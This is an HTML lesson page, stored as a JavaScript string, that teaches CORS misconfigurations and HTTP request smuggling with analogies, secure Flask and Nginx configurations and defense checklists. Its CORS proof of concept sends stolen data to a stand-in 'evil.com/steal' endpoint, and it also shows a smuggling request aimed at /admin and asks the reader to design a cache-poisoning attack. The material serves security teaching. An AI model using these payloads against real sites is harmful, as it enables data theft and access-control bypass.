SECTION_CONTENT_EN["web-09-01"] = `<h2>CORS &amp; HTTP Request Smuggling — Cracks in the Protocol</h2>

<div class="callout"><div class="callout-title">// Background Story: James Kettle and the Discovery of Request Smuggling</div>
In 2019, PortSwigger security researcher <strong>James Kettle</strong> published groundbreaking research systematizing <strong>HTTP Request Smuggling</strong> attacks. He discovered that when a reverse proxy (such as Nginx, Cloudflare) and the backend server disagree on the boundaries of an HTTP request, an attacker can "smuggle" a request — making it execute as the prefix of the next user's request on the backend.<br/><br/>
This research resulted in over 20 CVEs and affected <strong>Apache, Nginx, Varnish, HAProxy, Cloudflare</strong>, and virtually all major web infrastructure. In 2020, James used this technique to successfully attack <strong>Slack</strong>, earning a $6,500 bug bounty. Even more alarming, he discovered how to perform <strong>full-site cache poisoning</strong> through request smuggling — a single attack affecting all subsequent users.<br/><br/>
Request smuggling was long overlooked because it sits in the "gray area" of the HTTP protocol — most developers don't even know that <code>Content-Length</code> and <code>Transfer-Encoding</code> can coexist and create semantic conflicts.
</div>

<h3>Same-Origin Policy and CORS — The Browser's Access Control System</h3>

<p><strong>Analogy:</strong> Imagine a building with a strict access control system — you can only enter the floor belonging to your own department (Same-Origin Policy). But if a department manager signs a "pass" saying "allow people from the neighboring department to visit my floor" (CORS), the access control system will let them through.<br/><br/>
<strong>The problem is</strong>: if the manager is too generous — issuing passes to everyone (<code>Access-Control-Allow-Origin: *</code>), or giving a pass to whoever asks for one (reflective Origin) — it's as if there's no access control at all.</p>

<p><span class="glossary" data-term="Same-Origin Policy">Same-Origin Policy (SOP)</span> is the cornerstone of browser security: protocol + domain + port must all be identical to be considered "same origin." Pages from different origins cannot read each other's data, manipulate the DOM, or send requests with cookies.</p>

<p><span class="glossary" data-term="CORS">CORS (Cross-Origin Resource Sharing)</span> is the "exception approval process" for SOP — servers declare through specific HTTP response headers "which external domains are allowed to access my resources."</p>

<h3>CORS Attacks — Misconfigured Access Passes</h3>

<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><pre><code class="language-bash"># =============================================
# Dangerous CORS Misconfiguration Patterns
# =============================================

# Dangerous config 1: Wildcard + Credentials (most fatal!)
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# When both headers exist simultaneously, any website can read your API
# with the victim's cookies!
# The browser spec explicitly forbids this combination, but backends may not check

# Dangerous config 2: Reflective Origin (most common!)
# Server simply reflects back the Origin header from the request:
# Request: Origin: https://evil.com
# Response: Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# Effect: The attacker's website gains credentialed cross-origin access!

# Dangerous config 3: null origin trust
# When a page sends a request through a sandboxed iframe or data: URI,
# the Origin may be null. If the server trusts null origin...

# Dangerous config 4: Subdomain wildcard trust
# Access-Control-Allow-Origin: https://*.example.com
# If a subdomain has XSS, attackers can launch cross-origin requests from it
</code></pre></div>

<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><pre><code class="language-python"># =============================================
# CORS Secure Configuration Example (Flask)
# =============================================
from flask import Flask, request, jsonify

app = Flask(__name__)

# Safe practice: whitelist + exact match + distinguish credentials
ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get("Origin")
    
    # Exact match whitelist (no wildcards)
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        # If credentials are needed, Origin must be a specific domain
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
        # Preflight request cache time (reduces OPTIONS requests)
        response.headers["Access-Control-Max-Age"] = "3600"
    
    return response

# =============================================
# CORS Attack PoC (Attacker's Perspective)
# =============================================
# On the attacker's page at https://evil.com:
# <script>
# fetch("https://victim.com/api/user-info", {
#     credentials: "include",  // Auto-includes victim's cookies
#     headers: {"Content-Type": "application/json"}
# })
# .then(r => r.json())
# .then(data => {
#     // Steal victim's sensitive information
#     fetch("https://evil.com/steal?data=" + JSON.stringify(data))
# })
# </script>
</code></pre></div>

<h3>HTTP Request Smuggling — Two Guards Disagreeing with Each Other</h3>

<p><strong>What is it?</strong><br/><br/>
<strong>Analogy:</strong> Imagine a company with two guards — a security guard at the gate (frontend proxy) and a receptionist inside the building (backend server). The guard determines whether a letter has ended by counting the page count (<code>Content-Length</code>), while the receptionist determines it by looking for an "END" marker on the paper (<code>Transfer-Encoding: chunked</code>). If the two standards disagree, the content of the letter gets split incorrectly — the beginning of the second letter might be treated as the end of the first letter.</p>

<p><strong>Request smuggling exploits this "parsing discrepancy."</strong> The frontend proxy and the backend server disagree on the boundaries of the same HTTP request. The attacker can craft a request that "smuggles" something: the frontend thinks it's one request, but the backend thinks it's two requests. The second "smuggled" request can bypass all of the frontend's security checks.</p>

<pre>
╔══════════════════════════════════════════════════════════════╗
║                    CL.TE Request Smuggling Principle          ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Request sent by attacker:                                     ║
║  ┌──────────────────────────────────────────────┐             ║
║  │ POST / HTTP/1.1                              │             ║
║  │ Host: target.com                             │             ║
║  │ Content-Length: 34        ← Frontend proxy believes this  │ ║
║  │ Transfer-Encoding: chunked ← Backend server believes this│ ║
║  │                                              │             ║
║  │ 0                            ← Backend: chunk ends         │ ║
║  │                                              │             ║
║  │ GET /admin HTTP/1.1          ← Smuggled request!            │ ║
║  │ Host: target.com                             │             ║
║  │ Cookie: victim_session=xxx                   │             ║
║  └──────────────────────────────────────────────┘             ║
║                                                              ║
║  Frontend proxy (respects CL=34):                            ║
║    "This request body has 34 bytes... no, needs to read more"  ║
║    Caches the smuggled GET request as part of current request  ║
║                                                              ║
║  Backend server (respects TE=chunked):                        ║
║    "0 means the request has ended" -> process the first empty  ║
║    Smuggled GET /admin... -> "This is the next request!"       ║
║    -> Executed directly, bypassing all frontend authentication! ║
║                                                              ║
║  ★ The next victim's request gets prepended with smuggled leftovers║
║    -> Victim sees 404 or admin page instead of their normal request║
╚══════════════════════════════════════════════════════════════╝
</pre>

<h3>Three Types of Smuggling</h3>

<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><pre><code class="language-bash"># =============================================
# Type 1: CL.TE (Frontend uses CL, Backend uses TE)
# =============================================
# The most common smuggling type
# Frontend reads a fixed length based on Content-Length
# Backend reads in chunks based on Transfer-Encoding
# Attacker makes CL larger than the actual chunked content
# -> Backend finishes early -> remaining content is "smuggled"

# =============================================
# Type 2: TE.CL (Frontend uses TE, Backend uses CL)
# =============================================
# Frontend reads in chunks (considers done when it sees 0)
# Backend reads a fixed length based on Content-Length
# Attacker makes chunked content end early
# -> Backend continues reading -> smuggles the next request

# =============================================
# Type 3: TE.TE (Both use TE, but parse differently)
# =============================================
# Some implementations parse chunked encoding format differently
# For example, inconsistent handling of whitespace and comments in chunk sizes

# =============================================
# H2.TE Downgrade Attack (discovered in 2021)
# =============================================
# Attacker sends HTTP/2 request -> Frontend downgrades to HTTP/1.1 for backend
# TE/CL handling may change during downgrade -> new smuggling opportunities
</code></pre></div>

<h3>The Harms of Request Smuggling — Beyond Bypassing Authentication</h3>

<p>The damage from request smuggling goes far beyond simple authentication bypass:</p>

<ul>
<li><strong>Cache Poisoning</strong>: The attacker smuggles a request into the cache path. The caching system stores the malicious response, and all subsequent users visiting that path see the malicious content. This is <strong>the most destructive form of attack</strong>.</li>
<li><strong>Credential Hijacking</strong>: Smuggled requests can be used to capture the next user's request and response — including cookies, CSRF tokens, etc.</li>
<li><strong>Web Cache Deception</strong>: Exploiting path-handling discrepancies, the cache stores the victim's personal page as a public page.</li>
<li><strong>Bypass WAF/CDN Security Controls</strong>: Smuggled requests bypass all frontend security checks (because the frontend doesn't consider them as independent requests).</li>
</ul>

<h3>Defense Strategies</h3>

<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><pre><code class="language-bash"># =============================================
# Request Smuggling Defense (Nginx Configuration)
# =============================================

# 1. Ensure consistent HTTP protocol parsing between frontend and backend
# In Nginx, use the proxy_http_version directive

server {
    location / {
        # Use HTTP/1.1 to communicate with the backend
        proxy_http_version 1.1;
        
        # CRITICAL: Strip the TE header forwarded from frontend
        proxy_set_header Transfer-Encoding "";
        
        # Forward with explicit CL
        proxy_set_header Content-Length $content_length;
        
        # Disable chunked encoding forwarding
        proxy_request_buffering on;
    }
}

# 2. Backend: explicitly reject requests with TE header
# In backend code:
# if "Transfer-Encoding" in request.headers:
#     return 400, "TE not supported"

# 3. Use consistent connection reuse strategy between frontend and backend
# Avoid ambiguous request boundaries caused by Connection: keepalive

# =============================================
# CORS Defense Checklist
# =============================================
# 1. Use a whitelist (never use * or reflect)
# 2. Exact match on Origin (don't use regex matching)
# 3. ACAO + credentials must not appear together (unless Origin is a specific domain)
# 4. Set a reasonable Access-Control-Max-Age
# 5. Only allow necessary HTTP methods and request headers
# 6. Evaluate whether CORS is truly needed — many scenarios can use same-origin deployment instead
</code></pre></div>

<h3>Try It Yourself</h3>
<ol>
<li><strong>CORS Configuration Audit</strong>: Use Burp Suite or browser DevTools to inspect a target website's CORS configuration. Try modifying the Origin header to your domain and observe the response. Check for: wildcard Origin, reflective Origin, null Origin trust, ACAO+credentials appearing together.</li>

<li><strong>Request Smuggling Detection</strong>: Use <code>smuggler.py</code> (https://github.com/PortSwigger/smuggler) or manual methods to detect request smuggling on a target. Manual method: send a request with an oversized Content-Length and Transfer-Encoding: chunked, observe for request boundary anomalies. Note: only test on authorized targets!</li>

<li><strong>Cache Poisoning Analysis</strong>: Given the following scenario — a website uses CDN caching, with Varnish as frontend and Apache as backend. The attacker discovers that Varnish supports CL.TE smuggling. Please design a complete cache poisoning attack plan: what request to smuggle, which path to poison, what will the victim's normal visit see? How to defend?</li>
</ol>

<h3>Key Takeaways</h3>
<ul>
<li>Same-Origin Policy (SOP) is the cornerstone of browser security — protocol+domain+port all three must match to be same origin. CORS is SOP's "exception approval"</li>
<li>The most dangerous CORS configuration is "reflective Origin + Credentials" — effectively giving any requester a credentialed pass</li>
<li>HTTP Request Smuggling exploits CL/TE parsing discrepancies between the frontend proxy and backend server — "two guards disagreeing with each other"</li>
<li>Three smuggling types: CL.TE (most common), TE.CL, TE.TE — depending on which header each side trusts</li>
<li>The most lethal attack via request smuggling is cache poisoning — one attack affects all subsequent users</li>
<li>Defense: CORS uses a whitelist with exact Origin matching; request smuggling ensures consistent HTTP parsing and protocol between frontend and backend</li>
<li>James Kettle systematized request smuggling attacks in 2019 — affecting virtually all major web infrastructure</li>
</ul>
`;


